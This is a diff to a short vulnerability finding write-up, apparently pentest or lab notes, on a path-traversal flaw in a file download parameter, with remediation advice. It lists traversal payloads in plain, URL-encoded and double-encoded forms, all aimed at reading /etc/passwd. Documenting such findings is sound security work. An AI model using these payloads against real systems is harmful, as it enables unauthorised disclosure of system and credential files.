@@ -3,7 +3,7 @@
 **Date / Analyst:** $(date +%F) — Christopher Araque
 
 ## TL;DR
-Parameter `file`/`path` is not sanitized; `../../..` leads to `/etc/passwd`.
+Parameter `file`/`path` is not sanitized; traversal sequences allow reading `/etc/passwd`.
 
 ## Endpoint
 - <fill after recon> e.g., GET /download?file=../../../../../../etc/passwd
@@ -12,7 +12,7 @@ Parameter `file`/`path` is not sanitized; `../../..` leads to `/etc/passwd`.
 - Request/Response: [ps-007-request.txt](../../evidence/ps-traversal/ps-007-request.txt)
 - Screenshot: ![PS‑007](../../evidence/ps-traversal/ps-007-screenshot.png)
 
-## Payloads
+## Payloads (try in Repeater)
 ../../../../../../etc/passwd
 ..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
 ..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
@@ -21,4 +21,4 @@ Parameter `file`/`path` is not sanitized; `../../..` leads to `/etc/passwd`.
 Sensitive file disclosure (configs/keys/creds).
 
 ## Fix
-Canonicalize path; allow‑list files; deny `..` + encoded variants; sandbox/chroot.
+Canonicalize path; enforce allow‑list; deny `..` / `%2e` / `%2f` and double‑encoded variants; use chroot/sandbox.
